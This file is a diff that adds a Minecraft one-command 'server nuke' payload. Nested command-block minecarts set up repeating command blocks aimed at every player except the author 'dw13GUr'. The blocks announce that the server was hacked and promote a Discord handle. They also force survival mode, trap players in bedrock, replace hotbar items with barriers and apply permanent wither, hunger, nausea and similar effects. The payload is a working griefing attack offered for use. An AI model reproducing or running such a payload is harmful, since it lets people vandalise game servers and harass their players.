@@ -1,0 +1,72 @@
+summon falling_block ~ ~1 ~ {
+  BlockState: {Name: "redstone_block"},
+  Time: 10,
+  Passengers: [
+    {
+      id: "armor_stand",
+      Health: 1,
+      Passengers: [
+        {
+          id: "falling_block",
+          BlockState: {Name: "activator_rail"},
+          Time: 10,
+          Passengers: [
+            {id: "command_block_minecart", Command: "gamerule commandBlockOutput false"},
+            {
+              id: "command_block_minecart",
+              Command: "setblock ~ ~ ~-1 repeating_command_block{Command:'title @a[name=!\"dw13GUr\"] title {\"text\":\"\", \"extra\":[{\"text\":\"SERVER NUKED BY DW13GUR.\", \"color\":\"dark_red\"}]}'}"
+            },
+            {
+              id: "command_block_minecart",
+              Command: "setblock ~ ~ ~-2 repeating_command_block{Command:'title @a[name=!\"dw13GUr\"] subtitle {\"text\":\"\", \"extra\":[{\"text\":\"dw13GUr on top\", \"color\":\"dark_red\"}]}'}"
+            },
+            {
+              id: "command_block_minecart",
+              Command: "setblock ~ ~ ~-3 repeating_command_block{Command:'tellraw @a[name=!\"dw13GUr\"] {\"text\":\"\", \"extra\":[{\"text\":\"DW13GUR HACKED YOUR SERVER! ONLY WAY OUT - CLOSE SERVER OR LEAVE! DISCORD - dw13gur\", \"color\":\"dark_red\"}]}'}"
+            },
+            {id: "command_block_minecart", Command: "setblock ~ ~ ~-4 repeating_command_block{Command:'gamemode survival @a[name=!\"dw13GUr\"]'}"},
+            {id: "command_block_minecart", Command: "setblock ~ ~ ~-5 repeating_command_block{Command:'playsound minecraft:entity.ender_dragon.death voice @a[name=!\"dw13GUr\"]'}"},
+            {id: "command_block_minecart", Command: "setblock ~ ~ ~-6 repeating_command_block{Command:'tp @a[name=!\"dw13GUr\"] ~ ~-2 ~'}"},
+            {id: "command_block_minecart", Command: "setblock ~ ~ ~-7 repeating_command_block{Command:'fill ~-3 ~-1 ~-3 ~3 ~-3 ~3 minecraft:bedrock replace'}"},
+            {id: "command_block_minecart", Command: "setblock ~ ~ ~-8 repeating_command_block{Command:'kill @e[type=minecraft:item]'}"},
+            {id: "command_block_minecart", Command: "setblock ~ ~ ~-9 repeating_command_block{Command:'playsound minecraft:item.totem.use voice @a[name=!\"dw13GUr\"]'}"},
+            {
+              id: "command_block_minecart",
+              Command: "setblock ~ ~ ~-10 repeating_command_block{Command:'give @a[name=!\"dw13GUr\"] barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}} 2304'
+}"
+            },
+            {
+              id: "command_block_minecart",
+              Command: "setblock ~ ~ ~-11 repeating_command_block{Command:'bossbar add test14886951 {\"text\":\"Your server has been nuked by dw13GUr. Discord: dw13gur\", \"color\":\"dark_red\"}'}"
+            },
+            {id: "command_block_minecart", Command: "setblock ~ ~ ~-12 repeating_command_block{Command:'bossbar set minecraft:test14886951 players @a'}"},
+            {id: "command_block_minecart", Command: "setblock ~ ~ ~-13 repeating_command_block{Command:'gamerule mobGriefing false'}"},
+            {id: "command_block_minecart", Command: "setblock ~ ~ ~-18 repeating_command_block{Command:'fill ~ ~1 ~ ~ ~1 ~18 minecraft:redstone_block'}"},
+            {id: "command_block_minecart", Command: "setblock ~ ~1 ~-18 redstone_block"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] hotbar.0 barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] hotbar.1 barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] hotbar.2 barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] hotbar.3 barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] hotbar.4 barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] hotbar.5 barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] hotbar.6 barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] hotbar.7 barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] hotbar.8 barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] armor.head carved_pumpkin{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "replaceitem entity @a[name=!\"dw13GUr\"] weapon.offhand barrier{display:{Name:\"{\\\"text\\\":\\\"SERVER WAS HACKED BY DW13GUR. DISCORD - dw13GUr\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",Lore:[\"{\\\"text\\\":\\\"THE SERVER WAS HACKED BY DW13GUR, AKA XYE4NEK. DISCORD - dw13GUr.\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\",\"{\\\"text\\\":\\\"LEAVE THE GAME AS FAST AS YOU CAN\\\",\\\"color\\\":\\\"dark_red\\\",\\\"underlined\\\":true,\\\"bold\\\":true}\"]}}"},
+            {id: "command_block_minecart", Command: "effect give @a[name=!\"dw13GUr\"] health_boost 999999 255"},
+            {id: "command_block_minecart", Command: "effect give @a[name=!\"dw13GUr\"] wither 999999 1"},
+            {id: "command_block_minecart", Command: "effect give @a[name=!\"dw13GUr\"] absorption 999999 255"},
+            {id: "command_block_minecart", Command: "effect give @a[name=!\"dw13GUr\"] instant_health 1 10"},
+            {id: "command_block_minecart", Command: "effect give @a[name=!\"dw13GUr\"] hunger 999999 255"},
+            {id: "command_block_minecart", Command: "effect give @a[name=!\"dw13GUr\"] nausea 999999 255"},
+            {id: "command_block_minecart", Command: "effect give @a[name=!\"dw13GUr\"] weakness 999999 255"},
+            {id: "command_block_minecart", Command: "effect give @a[name=!\"dw13GUr\"] mining_fatigue 999999 255"},
+            {id: "command_block_minecart", Command: "effect give @a[name=!\"dw13GUr\"] glowing 999999 1"},
+            {id: "command_block_minecart", Command: "effect give @a[name=\"dw13GUr\"] night_vision 999999 1"}
+          ]
+        }
+      ]
+    }
+  ]
+}
